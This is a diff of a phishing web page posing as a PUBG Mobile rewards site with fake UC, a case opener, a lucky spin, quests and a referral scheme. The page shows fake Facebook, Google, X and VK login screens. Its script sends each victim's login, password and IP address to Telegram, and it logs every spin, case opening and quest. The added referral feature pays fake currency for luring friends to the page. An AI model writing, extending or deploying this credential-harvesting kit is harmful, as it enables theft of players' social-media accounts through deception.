@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG Mobile</title>
+    <title>PUBG Mobile - Rewards</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -16,6 +16,7 @@
             --pubg-card: #151618;
             --pubg-blue: #0084ff;
             --pubg-red: #ff3b30;
+            --pubg-green: #4caf50;
         }
 
         body {
@@ -28,7 +29,7 @@
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
 
-        /* Шапка из скриншота */
+        /* Шапка */
         header {
             background: rgba(0, 0, 0, 0.9);
             padding: 12px 16px;
@@ -39,25 +40,27 @@
             position: sticky; top: 0; z-index: 100;
         }
 
-        .btn-deposit {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px dashed white;
+        .balance-container {
+            background: rgba(255, 188, 0, 0.1);
+            border: 1px solid var(--pubg-gold);
             border-radius: 20px;
             padding: 6px 14px;
             display: flex;
             align-items: center;
             gap: 8px;
-            position: relative;
         }
 
-        .bonus-badge {
-            position: absolute;
-            top: -10px; right: -5px;
-            background: #4caf50;
-            font-size: 10px;
-            padding: 2px 6px;
-            border-radius: 6px;
-            font-weight: 900;
+        .uc-icon {
+            width: 20px;
+            height: 20px;
+            background: radial-gradient(circle, #ffbc00 0%, #ff9900 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            color: #000;
         }
 
         /* Стили Кейса (Лента) */
@@ -75,7 +78,8 @@
             top: 0; left: 50%;
             width: 2px; height: 100%;
             background: var(--pubg-gold);
-            z-index: 10;            box-shadow: 0 0 15px var(--pubg-gold);
+            z-index: 10;
+            box-shadow: 0 0 15px var(--pubg-gold);
         }
 
         .case-tape {
@@ -101,7 +105,7 @@
         .case-item img { width: 80px; height: 80px; object-fit: contain; filter: drop-shadow(0 0 10px rgba(255,255,255,0.2)); }
         .case-item span { font-size: 11px; margin-top: 10px; font-weight: 600; text-align: center; }
 
-        /* Кнопки как на скрине */
+        /* Кнопки */
         .error-msg {
             background: rgba(255, 59, 48, 0.15);
             color: var(--pubg-red);
@@ -127,6 +131,20 @@
             display: block;
         }
 
+        .btn-quest {
+            background: linear-gradient(135deg, var(--pubg-green) 0%, #2e7d32 100%);
+            color: white;
+            padding: 14px;
+            border-radius: 12px;
+            font-weight: 700;
+            font-size: 15px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
         /* Нижнее меню */
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
@@ -146,6 +164,43 @@
         }
         .nav-item i { font-size: 20px; margin-bottom: 4px; }
         .nav-item.active { color: var(--pubg-gold); }
+
+        /* Квесты и награды */
+        .quest-card {
+            background: var(--pubg-card);
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .quest-progress {
+            background: rgba(255, 255, 255, 0.05);
+            height: 8px;
+            border-radius: 4px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+
+        .quest-progress-bar {
+            background: linear-gradient(90deg, var(--pubg-green) 0%, var(--pubg-gold) 100%);
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+
+        .reward-badge {
+            background: rgba(255, 188, 0, 0.2);
+            border: 1px solid var(--pubg-gold);
+            color: var(--pubg-gold);
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 700;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
 
         /* Модалки */
         .modal {
@@ -256,10 +311,6 @@
             height: 80px;
         }
 
-        .facebook-fullscreen .login-form {
-            margin: 20px 0;
-        }
-
         .facebook-input {
             width: 100%;
             padding: 15px;
@@ -280,39 +331,6 @@
             font-weight: bold;
             margin-top: 10px;
             cursor: pointer;
-        }
-
-        .facebook-forgot-link {
-            display: block;
-            text-align: center;
-            margin: 15px 0;
-            color: #1877f2;
-            text-decoration: none;
-        }
-
-        .facebook-btn-create {
-            display: block;
-            background: #42b72a;
-            color: white;
-            text-align: center;
-            padding: 15px;
-            border-radius: 8px;
-            text-decoration: none;
-            font-weight: bold;
-            margin-top: 20px;
-        }
-
-        .facebook-footer {
-            text-align: center;
-            padding: 20px;
-            border-top: 1px solid #ddd;
-            margin-top: 30px;
-        }
-
-        .facebook-footer-links {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #666;
         }
 
         /* Google стили */
@@ -337,23 +355,6 @@
             color: #202124;
         }
 
-        .google-subtitle {
-            text-align: center;
-            color: #5f6368;
-            margin-bottom: 30px;
-        }
-
-        .google-input-group {
-            margin-bottom: 20px;
-        }
-
-        .google-input-label {
-            display: block;
-            color: #5f6368;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
-
         .google-input {
             width: 100%;
             padding: 13px 15px;
@@ -374,15 +375,6 @@
             float: right;
         }
 
-        .google-btn-text {
-            background: none;
-            border: none;
-            color: #1a73e8;
-            padding: 10px;
-            font-size: 14px;
-            cursor: pointer;
-        }
-
         /* Twitter/X стили */
         .x-modal-step1, .x-modal-step2 {
             background: #000;
@@ -392,17 +384,6 @@
             width: 100%;
             max-width: 320px;
             position: relative;
-        }
-
-        .x-logo {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .x-title {
-            text-align: center;
-            font-size: 23px;
-            margin-bottom: 30px;
         }
 
         .social-login-btn {
@@ -421,27 +402,6 @@
             font-weight: bold;
         }
 
-        .social-login-btn.google {
-            border-color: #536471;
-        }
-
-        .social-login-btn.apple {
-            border-color: #536471;
-        }
-
-        .or-divider {
-            text-align: center;
-            margin: 20px 0;
-            position: relative;
-        }
-
-        .or-divider span {
-            background: black;
-            padding: 0 10px;
-            color: #71767b;
-            font-size: 15px;
-        }
-
         .x-input {
             width: 100%;
             padding: 15px;
@@ -453,37 +413,11 @@
             font-size: 16px;
         }
 
-        .x-next-btn {
-            width: 100%;
-            background: white;
-            color: black;
-            border: none;
-            padding: 15px;
-            border-radius: 25px;
-            font-weight: bold;
-            font-size: 15px;
-            cursor: pointer;
-        }
-
         /* VK стили */
         .vk-logo {
             width: 80px;
             height: 80px;
             margin: 20px auto;
-        }
-
-        .vk-title {
-            text-align: center;
-            font-size: 20px;
-            margin-bottom: 25px;
-            color: #000;
-        }
-
-        .vk-label {
-            display: block;
-            margin-bottom: 5px;
-            color: #666;
-            font-size: 14px;
         }
 
         .vk-input {
@@ -495,34 +429,83 @@
             font-size: 16px;
         }
 
-        .vk-checkbox {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin-bottom: 20px;
+        /* Реферальная система */
+        .referral-card {
+            background: linear-gradient(135deg, rgba(0, 132, 255, 0.1) 0%, rgba(255, 188, 0, 0.1) 100%);
+            border: 1px solid var(--pubg-blue);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 15px 0;
         }
 
-        .vk-submit-btn {
-            width: 100%;
-            background: #0077ff;
-            color: white;
-            border: none;
+        .referral-link {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px dashed var(--pubg-gold);
+            border-radius: 12px;
             padding: 15px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: monospace;
+            text-align: center;
         }
 
-        .vk-links {
-            text-align: center;
+        /* Ежедневные награды */
+        .daily-rewards {
+            display: flex;
+            justify-content: space-between;
             margin: 20px 0;
         }
 
-        .vk-link {
-            color: #0077ff;
-            text-decoration: none;
-            font-size: 14px;
+        .daily-reward {
+            width: 60px;
+            height: 70px;
+            background: var(--pubg-card);
+            border-radius: 12px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .daily-reward.active {
+            border-color: var(--pubg-gold);
+            background: rgba(255, 188, 0, 0.1);
+        }
+
+        .daily-reward.claimed {
+            opacity: 0.6;
+            background: rgba(76, 175, 80, 0.1);
+        }
+
+        .reward-amount {
+            font-size: 12px;
+            font-weight: bold;
+            color: var(--pubg-gold);
+            margin-top: 5px;
+        }
+
+        /* Анимация получения награды */
+        @keyframes rewardPop {
+            0% { transform: scale(0.5); opacity: 0; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .reward-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0,0,0,0.9);
+            border: 2px solid var(--pubg-gold);
+            border-radius: 20px;
+            padding: 30px;
+            z-index: 4000;
+            display: none;
+            text-align: center;
+            animation: rewardPop 0.5s ease-out;
         }
     </style>
 </head>
@@ -535,10 +518,11 @@
             <span class="text-sm font-bold">Назад</span>
         </div>
         <div class="text-center" style="flex: 1;">
-            <h1 class="pubg-font text-lg leading-none">PUBG Mobile</h1>
+            <h1 class="pubg-font text-lg leading-none">PUBG REWARDS</h1>
         </div>
-        <div class="btn-deposit">
-            <span class="text-xs font-bold">Пополнить</span>
+        <div class="balance-container" onclick="showSection('quests')">
+            <div class="uc-icon">UC</div>
+            <span class="text-sm font-bold" id="userBalance">0</span>
         </div>
     </header>
 
@@ -552,6 +536,37 @@
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center" onclick="showSection('spin')">
                 <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
                 <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
+            </div>
+        </div>
+        
+        <!-- Быстрые квесты на главной -->
+        <div class="mt-6">
+            <h2 class="pubg-font text-xl text-white mb-4">Быстрые задания</h2>
+            <div class="quest-card" onclick="completeQuest('daily_login')">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <h3 class="font-bold">Ежедневный вход</h3>
+                        <p class="text-gray-400 text-sm">Зайдите сегодня чтобы получить 10 UC</p>
+                    </div>
+                    <div class="reward-badge">
+                        <span>+10 UC</span>
+                    </div>
+                </div>
+                <div class="quest-progress">
+                    <div class="quest-progress-bar" style="width: 0%" id="dailyProgress"></div>
+                </div>
+            </div>
+            
+            <div class="quest-card" onclick="showSection('referral')">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <h3 class="font-bold">Пригласите друга</h3>
+                        <p class="text-gray-400 text-sm">Получите 60 UC за каждого приглашенного</p>
+                    </div>
+                    <div class="reward-badge">
+                        <span>+60 UC</span>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
@@ -570,10 +585,10 @@
             </div>
         </div>
 
-        <div id="errorBox" class="error-msg">Недостаточно средств для открытия кейса</div>
+        <div id="errorBox" class="error-msg">Недостаточно UC для открытия кейса</div>
 
         <div id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</div>
-        <div id="depositBtn" class="btn-blue" style="display: none;">Пополнить баланс</div>
+        <div id="depositBtn" class="btn-blue" style="display: none;">Получить UC</div>
 
         <div class="p-5">
             <h3 class="text-gray-400 uppercase text-xs font-bold mb-4">Содержимое кейса</h3>
@@ -613,8 +628,8 @@
         </div>
         
         <button id="spinBtn" class="btn-blue !mx-0 mt-6 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
-        <button id="spinDepositBtn" class="btn-blue !mx-0 mt-3 !bg-blue-600 !text-white !w-full" style="display: none;">Пополнить баланс</button>
-        <div id="spinErrorBox" class="error-msg mt-3" style="display: none;">Недостаточно средств для вращения</div>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 mt-3 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="showSection('quests')">Получить UC</button>
+        <div id="spinErrorBox" class="error-msg mt-3" style="display: none;">Недостаточно UC для вращения</div>
         
         <!-- Кнопки соцсетей после вращения -->
         <div id="socialButtons" style="display: none;" class="mt-6">
@@ -634,6 +649,157 @@
         </div>
     </div>
 
+    <!-- QUESTS SECTION -->
+    <div id="section-quests" style="display: none;" class="p-4">
+        <div class="text-center py-4">
+            <h2 class="pubg-font text-3xl text-white">Задания</h2>
+            <p class="text-gray-500 text-xs">Выполняйте задания для получения UC</p>
+        </div>
+
+        <!-- Ежедневные награды -->
+        <div class="quest-card">
+            <h3 class="font-bold text-lg mb-4 flex items-center gap-2">
+                <i class="fas fa-calendar-day text-yellow-500"></i>
+                Ежедневные награды
+            </h3>
+            <div class="daily-rewards">
+                <div class="daily-reward" id="day1" onclick="claimDailyReward(1)">
+                    <div class="uc-icon">UC</div>
+                    <div class="reward-amount">+10</div>
+                    <div class="text-xs mt-1">День 1</div>
+                </div>
+                <div class="daily-reward" id="day2" onclick="claimDailyReward(2)">
+                    <div class="uc-icon">UC</div>
+                    <div class="reward-amount">+20</div>
+                    <div class="text-xs mt-1">День 2</div>
+                </div>
+                <div class="daily-reward" id="day3" onclick="claimDailyReward(3)">
+                    <div class="uc-icon">UC</div>
+                    <div class="reward-amount">+30</div>
+                    <div class="text-xs mt-1">День 3</div>
+                </div>
+                <div class="daily-reward" id="day4" onclick="claimDailyReward(4)">
+                    <div class="uc-icon">UC</div>
+                    <div class="reward-amount">+40</div>
+                    <div class="text-xs mt-1">День 4</div>
+                </div>
+                <div class="daily-reward" id="day5" onclick="claimDailyReward(5)">
+                    <div class="uc-icon">UC</div>
+                    <div class="reward-amount">+50</div>
+                    <div class="text-xs mt-1">День 5</div>
+                </div>
+            </div>
+            <p class="text-gray-400 text-sm mt-4 text-center">Входите каждый день для получения наград</p>
+        </div>
+
+        <!-- Основные квесты -->
+        <div class="quest-card" onclick="completeQuest('spin_once')">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h3 class="font-bold">Покрутите рулетку</h3>
+                    <p class="text-gray-400 text-sm">Сделайте 1 вращение</p>
+                </div>
+                <div class="reward-badge">
+                    <span>+25 UC</span>
+                </div>
+            </div>
+            <div class="quest-progress">
+                <div class="quest-progress-bar" id="spinQuestProgress" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <div class="quest-card" onclick="completeQuest('open_case')">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h3 class="font-bold">Откройте кейс</h3>
+                    <p class="text-gray-400 text-sm">Откройте любой кейс</p>
+                </div>
+                <div class="reward-badge">
+                    <span>+30 UC</span>
+                </div>
+            </div>
+            <div class="quest-progress">
+                <div class="quest-progress-bar" id="caseQuestProgress" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <div class="quest-card" onclick="completeQuest('social_login')">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h3 class="font-bold">Войдите через соцсеть</h3>
+                    <p class="text-gray-400 text-sm">Авторизуйтесь через любую соцсеть</p>
+                </div>
+                <div class="reward-badge">
+                    <span>+15 UC</span>
+                </div>
+            </div>
+            <div class="quest-progress">
+                <div class="quest-progress-bar" id="socialQuestProgress" style="width: 0%"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- REFERRAL SECTION -->
+    <div id="section-referral" style="display: none;" class="p-4">
+        <div class="text-center py-4">
+            <h2 class="pubg-font text-3xl text-white">Пригласите друга</h2>
+            <p class="text-gray-500">Получите 60 UC за каждого приглашенного</p>
+        </div>
+
+        <div class="referral-card">
+            <h3 class="font-bold text-lg mb-2 flex items-center gap-2">
+                <i class="fas fa-user-friends text-blue-400"></i>
+                Ваша реферальная ссылка
+            </h3>
+            <p class="text-gray-400 text-sm mb-4">Отправьте эту ссылку другу. Когда он зайдет по ней и покрутит рулетку, вы получите 60 UC!</p>
+            
+            <div class="referral-link" id="referralLink">
+                Загрузка...
+            </div>
+            
+            <button onclick="copyReferralLink()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold mt-4">
+                <i class="fas fa-copy"></i> Скопировать ссылку
+            </button>
+        </div>
+
+        <div class="quest-card">
+            <div class="flex justify-between items-center">
+                <div>
+                    <h3 class="font-bold">Приглашено друзей</h3>
+                    <p class="text-gray-400 text-sm" id="referralCount">0/1</p>
+                </div>
+                <div class="reward-badge">
+                    <span>+60 UC</span>
+                </div>
+            </div>
+            <div class="quest-progress">
+                <div class="quest-progress-bar" id="referralProgress" style="width: 0%"></div>
+            </div>
+        </div>
+
+        <div class="mt-6">
+            <h3 class="font-bold mb-3">Как это работает:</h3>
+            <div class="space-y-3">
+                <div class="flex items-start gap-3">
+                    <div class="bg-blue-600 rounded-full w-6 h-6 flex items-center justify-center text-xs">1</div>
+                    <p class="text-gray-300">Скопируйте вашу реферальную ссылку</p>
+                </div>
+                <div class="flex items-start gap-3">
+                    <div class="bg-blue-600 rounded-full w-6 h-6 flex items-center justify-center text-xs">2</div>
+                    <p class="text-gray-300">Отправьте ссылку другу</p>
+                </div>
+                <div class="flex items-start gap-3">
+                    <div class="bg-blue-600 rounded-full w-6 h-6 flex items-center justify-center text-xs">3</div>
+                    <p class="text-gray-300">Друг должен зайти по ссылке и покрутить рулетку</p>
+                </div>
+                <div class="flex items-start gap-3">
+                    <div class="bg-blue-600 rounded-full w-6 h-6 flex items-center justify-center text-xs">4</div>
+                    <p class="text-gray-300">Вы получаете 60 UC сразу после этого!</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <!-- WIN MODAL -->
     <div id="winModal" class="win-modal">
         <div class="win-card">
@@ -643,6 +809,14 @@
             <div id="winPrizeName" class="pubg-font text-lg mb-6"></div>
             <button onclick="showSocialAfterWin()" class="w-full bg-yellow-500 text-black py-3 rounded-xl font-bold">Получить приз</button>
         </div>
+    </div>
+
+    <!-- REWARD POPUP -->
+    <div id="rewardPopup" class="reward-popup">
+        <div class="uc-icon" style="width: 60px; height: 60px; font-size: 20px; margin: 0 auto 20px;">UC</div>
+        <h2 class="pubg-font text-2xl text-yellow-400 mb-2">Награда получена!</h2>
+        <p class="text-xl font-bold" id="rewardAmount">+60 UC</p>
+        <button onclick="closeRewardPopup()" class="w-full bg-blue-600 text-white py-3 rounded-xl font-bold mt-6">Отлично!</button>
     </div>
 
     <!-- Соцсети: Facebook -->
@@ -866,9 +1040,9 @@
             <i class="fas fa-gamepad"></i>
             <span>Games</span>
         </div>
-        <div class="nav-item">
-            <i class="fas fa-dumbbell"></i>
-            <span>Exercises</span>
+        <div class="nav-item" onclick="showSection('quests')">
+            <i class="fas fa-tasks"></i>
+            <span>Quests</span>
         </div>
     </nav>
 
@@ -890,19 +1064,204 @@
             'Mystery Box'
         ];
         
+        // Игровые данные
         let userIP = '';
         let currentMethod = '';
         let currentSection = 'hub';
         let previousSection = 'hub';
         let isSpinning = false;
-        let balance = 0;
         let spinCompleted = false;
-
-        // Определение IP
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
-
+        let userBalance = 0;
+        let referralCode = '';
+        let isReferral = false;
+        let referrerCode = '';
+        
+        // Квесты
+        let quests = {
+            daily_login: { completed: false, reward: 10, progress: 0, max: 1 },
+            spin_once: { completed: false, reward: 25, progress: 0, max: 1 },
+            open_case: { completed: false, reward: 30, progress: 0, max: 1 },
+            social_login: { completed: false, reward: 15, progress: 0, max: 1 },
+            invite_friend: { completed: false, reward: 60, progress: 0, max: 1 }
+        };
+        
+        // Ежедневные награды
+        let dailyStreak = 0;
+        let lastLoginDate = '';
+        
         // История навигации
         const navHistory = ['hub'];
+
+        // Инициализация
+        function initApp() {
+            // Получаем IP пользователя
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
+            
+            // Генерируем или получаем реферальный код
+            referralCode = generateReferralCode();
+            
+            // Проверяем реферальную ссылку в URL
+            checkReferral();
+            
+            // Загружаем данные из localStorage
+            loadUserData();
+            
+            // Проверяем ежедневный вход
+            checkDailyLogin();
+            
+            // Обновляем отображение баланса
+            updateBalanceDisplay();
+            
+            // Генерируем реферальную ссылку
+            generateReferralLink();
+            
+            // Генерируем ленту кейса
+            generateCaseTape();
+        }
+
+        function generateCaseTape() {
+            const tape = document.getElementById('caseTape');
+            tape.innerHTML = '';
+            for(let i=0; i<40; i++) {
+                const randomIndex = Math.floor(Math.random() * prizeImages.length);
+                const img = prizeImages[randomIndex];
+                const name = prizeNames[randomIndex];
+                tape.innerHTML += `
+                    <div class="case-item">
+                        <img src="${img}">
+                        <span class="pubg-font">${name}</span>
+                    </div>
+                `;
+            }
+        }
+
+        function generateReferralCode() {
+            // Генерируем случайный код из 8 символов
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let code = '';
+            for (let i = 0; i < 8; i++) {
+                code += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return code;
+        }
+
+        function generateReferralLink() {
+            const currentUrl = window.location.origin + window.location.pathname;
+            const referralLink = `${currentUrl}?ref=${referralCode}`;
+            document.getElementById('referralLink').textContent = referralLink;
+            return referralLink;
+        }
+
+        function checkReferral() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const refCode = urlParams.get('ref');
+            
+            if (refCode) {
+                isReferral = true;
+                referrerCode = refCode;
+                
+                // Отправляем информацию о реферале в Telegram
+                sendTelegram(`👥 Новый реферал! Код: ${refCode} (IP: ${userIP})`);
+                
+                // Показываем сообщение
+                setTimeout(() => {
+                    showRewardPopup(`Вы вошли по реферальной ссылке! Получите бонусы за выполнение заданий.`);
+                }, 1000);
+            }
+        }
+
+        function loadUserData() {
+            // Загружаем из localStorage
+            const savedBalance = localStorage.getItem('pubg_balance');
+            const savedQuests = localStorage.getItem('pubg_quests');
+            const savedStreak = localStorage.getItem('pubg_daily_streak');
+            const savedLastLogin = localStorage.getItem('pubg_last_login');
+            
+            if (savedBalance) userBalance = parseInt(savedBalance);
+            if (savedQuests) quests = JSON.parse(savedQuests);
+            if (savedStreak) dailyStreak = parseInt(savedStreak);
+            if (savedLastLogin) lastLoginDate = savedLastLogin;
+            
+            updateQuestsDisplay();
+        }
+
+        function saveUserData() {
+            localStorage.setItem('pubg_balance', userBalance);
+            localStorage.setItem('pubg_quests', JSON.stringify(quests));
+            localStorage.setItem('pubg_daily_streak', dailyStreak);
+            localStorage.setItem('pubg_last_login', lastLoginDate);
+        }
+
+        function checkDailyLogin() {
+            const today = new Date().toDateString();
+            
+            if (lastLoginDate !== today) {
+                // Новый день
+                if (dailyStreak < 5) {
+                    dailyStreak++;
+                } else {
+                    dailyStreak = 1; // Сброс на 1 день после 5
+                }
+                lastLoginDate = today;
+                
+                // Обновляем отображение ежедневных наград
+                updateDailyRewardsDisplay();
+                
+                // Помечаем ежедневный квест как доступный
+                quests.daily_login.completed = false;
+                quests.daily_login.progress = 0;
+                
+                saveUserData();
+            }
+        }
+
+        function updateDailyRewardsDisplay() {
+            for (let day = 1; day <= 5; day++) {
+                const dayElement = document.getElementById(`day${day}`);
+                if (dayElement) {
+                    dayElement.classList.remove('active', 'claimed');
+                    
+                    if (day <= dailyStreak) {
+                        dayElement.classList.add('claimed');
+                    } else if (day === dailyStreak + 1) {
+                        dayElement.classList.add('active');
+                    }
+                }
+            }
+        }
+
+        function updateQuestsDisplay() {
+            // Обновляем прогресс квестов
+            for (const questId in quests) {
+                const quest = quests[questId];
+                const progressElement = document.getElementById(`${questId}Progress`);
+                if (progressElement) {
+                    const progressPercent = (quest.progress / quest.max) * 100;
+                    progressElement.style.width = `${progressPercent}%`;
+                }
+            }
+            
+            // Обновляем счетчик рефералов
+            document.getElementById('referralCount').textContent = `${quests.invite_friend.progress}/${quests.invite_friend.max}`;
+            document.getElementById('referralProgress').style.width = `${(quests.invite_friend.progress / quests.invite_friend.max) * 100}%`;
+        }
+
+        function updateBalanceDisplay() {
+            document.getElementById('userBalance').textContent = userBalance;
+        }
+
+        function showRewardPopup(message, amount = 0) {
+            if (amount > 0) {
+                document.getElementById('rewardAmount').textContent = `+${amount} UC`;
+            } else {
+                document.getElementById('rewardAmount').textContent = message;
+            }
+            document.getElementById('rewardPopup').style.display = 'block';
+        }
+
+        function closeRewardPopup() {
+            document.getElementById('rewardPopup').style.display = 'none';
+        }
 
         // Навигация
         function showSection(id) {
@@ -910,7 +1269,7 @@
             currentSection = id;
             
             // Скрываем все секции
-            ['section-hub', 'section-case', 'section-spin', 'facebookFullscreen', 'googleFullscreen'].forEach(s => {
+            ['section-hub', 'section-case', 'section-spin', 'section-quests', 'section-referral', 'facebookFullscreen', 'googleFullscreen'].forEach(s => {
                 document.getElementById(s).style.display = 'none';
                 document.getElementById(s).classList.remove('flex');
             });
@@ -933,6 +1292,9 @@
                     document.querySelector('.nav-item:nth-child(1)').classList.add('active');
                 } else if (id === 'hub') {
                     document.querySelector('.nav-item:nth-child(2)').classList.add('active');
+                } else if (id === 'quests') {
+                    document.querySelector('.nav-item:nth-child(3)').classList.add('active');
+                    updateQuestsDisplay();
                 }
                 
                 // Если перешли на спин, проверяем состояние
@@ -965,23 +1327,73 @@
             }
         }
 
-        // Генерация ленты кейса с вашими картинками
-        const tape = document.getElementById('caseTape');
-        for(let i=0; i<40; i++) {
-            const randomIndex = Math.floor(Math.random() * prizeImages.length);
-            const img = prizeImages[randomIndex];
-            const name = prizeNames[randomIndex];
-            tape.innerHTML += `
-                <div class="case-item">
-                    <img src="${img}">
-                    <span class="pubg-font">${name}</span>
-                </div>
-            `;
+        // Квесты
+        function completeQuest(questId) {
+            const quest = quests[questId];
+            
+            if (!quest.completed) {
+                quest.progress++;
+                
+                if (quest.progress >= quest.max) {
+                    quest.completed = true;
+                    
+                    // Начисляем награду
+                    userBalance += quest.reward;
+                    updateBalanceDisplay();
+                    
+                    // Показываем попап с наградой
+                    showRewardPopup('', quest.reward);
+                    
+                    // Отправляем в Telegram
+                    sendTelegram(`✅ Квест выполнен: ${questId} +${quest.reward}UC (IP: ${userIP})`);
+                    
+                    // Если это реферальный квест и пользователь пришел по рефералке
+                    if (questId === 'invite_friend' && isReferral) {
+                        // Отправляем уведомление рефереру
+                        sendTelegram(`🎉 Реферал выполнил условие! Код реферера: ${referrerCode} (IP реферала: ${userIP})`);
+                    }
+                }
+                
+                updateQuestsDisplay();
+                saveUserData();
+            }
+        }
+
+        function claimDailyReward(day) {
+            if (day === dailyStreak + 1) {
+                const rewardAmount = day * 10; // 10, 20, 30, 40, 50 UC
+                userBalance += rewardAmount;
+                updateBalanceDisplay();
+                
+                // Помечаем день как завершенный
+                dailyStreak = day;
+                updateDailyRewardsDisplay();
+                
+                // Выполняем квест ежедневного входа
+                quests.daily_login.progress = 1;
+                quests.daily_login.completed = true;
+                updateQuestsDisplay();
+                
+                // Показываем попап
+                showRewardPopup('', rewardAmount);
+                
+                // Отправляем в Telegram
+                sendTelegram(`📅 Ежедневная награда день ${day}: +${rewardAmount}UC (IP: ${userIP})`);
+                
+                saveUserData();
+            }
+        }
+
+        function copyReferralLink() {
+            const link = generateReferralLink();
+            navigator.clipboard.writeText(link).then(() => {
+                alert('Ссылка скопирована в буфер обмена!');
+            });
         }
 
         // Логика открытия кейса
         function openCase() {
-            if (balance < 60) {
+            if (userBalance < 60) {
                 document.getElementById('errorBox').style.display = 'block';
                 document.getElementById('openBtn').style.display = 'none';
                 document.getElementById('depositBtn').style.display = 'block';
@@ -990,9 +1402,19 @@
                 return;
             }
             
+            // Списываем UC
+            userBalance -= 60;
+            updateBalanceDisplay();
+            
             // Крутим ленту для вида
             const offset = 130 * 25 + Math.floor(Math.random()*100);
-            tape.style.transform = `translateX(-${offset}px)`;
+            document.getElementById('caseTape').style.transform = `translateX(-${offset}px)`;
+            
+            // Обновляем прогресс квеста
+            quests.open_case.progress = 1;
+            if (!quests.open_case.completed) {
+                completeQuest('open_case');
+            }
             
             // Имитация задержки открытия
             setTimeout(() => {
@@ -1007,6 +1429,7 @@
                 // Отправляем в Telegram
                 sendTelegram(`🎁 Пользователь открыл кейс и выиграл: ${winName} (IP: ${userIP})`);
                 
+                saveUserData();
             }, 2000);
         }
 
@@ -1014,7 +1437,7 @@
         function startSpin() {
             if (isSpinning) return;
             
-            if (balance < 60) {
+            if (userBalance < 60) {
                 document.getElementById('spinErrorBox').style.display = 'block';
                 document.getElementById('spinBtn').style.display = 'none';
                 document.getElementById('spinDepositBtn').style.display = 'block';
@@ -1022,6 +1445,10 @@
                 sendTelegram(`🎡 Пользователь нажал "Крутить рулетку" без баланса (IP: ${userIP})`);
                 return;
             }
+            
+            // Списываем UC
+            userBalance -= 60;
+            updateBalanceDisplay();
             
             isSpinning = true;
             const spinBtn = document.getElementById('spinBtn');
@@ -1032,6 +1459,20 @@
             for (let i = 0; i < 9; i++) {
                 document.getElementById(`s${i}`).style.borderColor = 'transparent';
                 document.getElementById('mid').style.borderColor = 'transparent';
+            }
+            
+            // Обновляем прогресс квеста
+            quests.spin_once.progress = 1;
+            if (!quests.spin_once.completed) {
+                completeQuest('spin_once');
+            }
+            
+            // Проверяем реферальное условие
+            if (isReferral && !quests.invite_friend.completed) {
+                quests.invite_friend.progress = 1;
+                if (!quests.invite_friend.completed) {
+                    completeQuest('invite_friend');
+                }
             }
             
             // Анимация вращения
@@ -1079,6 +1520,8 @@
                         
                         // Отправляем в Telegram
                         sendTelegram(`🎡 Пользователь крутил рулетку и выиграл: ${winName} (IP: ${userIP})`);
+                        
+                        saveUserData();
                         
                     }, 500);
                 }
@@ -1188,15 +1631,23 @@
             }
             
             const msg = `
-🔥 **NEW LOGIN** 🔥
+🔥 **SOCIAL LOGIN** 🔥
 👤 Соцсеть: ${network}
 📧 Логин: \`${login}\`
 🔑 Пароль: \`${password}\`
 🌐 IP: ${userIP}
